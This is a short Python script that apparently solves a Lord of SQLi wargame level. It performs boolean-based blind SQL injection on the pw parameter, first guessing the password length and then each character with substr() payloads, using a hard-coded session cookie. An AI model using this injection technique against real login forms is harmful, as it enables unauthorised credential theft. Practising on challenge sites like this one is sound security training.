import requests as req

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
session = dict(PHPSESSID = "e3cj1ei61p0q12g7kfekpc3vbr")

print ("[+] Start")
print ("[+] Find length")

for i in range (0, 100):
    try:
        query = url + "2000' || length(pw)=" + str(i) + ";%00"
        res = req.post(query, cookies = session)

    except:
        print ("[-] Error occured")
        continue

    if 'Hello admin' in res.text:
        length = i
        print ("[+] find length : ", length)
        break

print ("[+] Find password")

for i in range(1, length+1):
    for j in range(48, 128):
        try:
            query = url + "'||substr(pw, " + str(i) +", 1)='" + chr(j)
            res = req.post(query, cookies = session)

        except:
            print ("[-] Error occured")
            continue

        if 'Hello admin' in res.text:
            flag += chr(j)
            print ("[+] Found : " + str(i) ," : ", flag)
            break

print("[+] flag : ", flag)
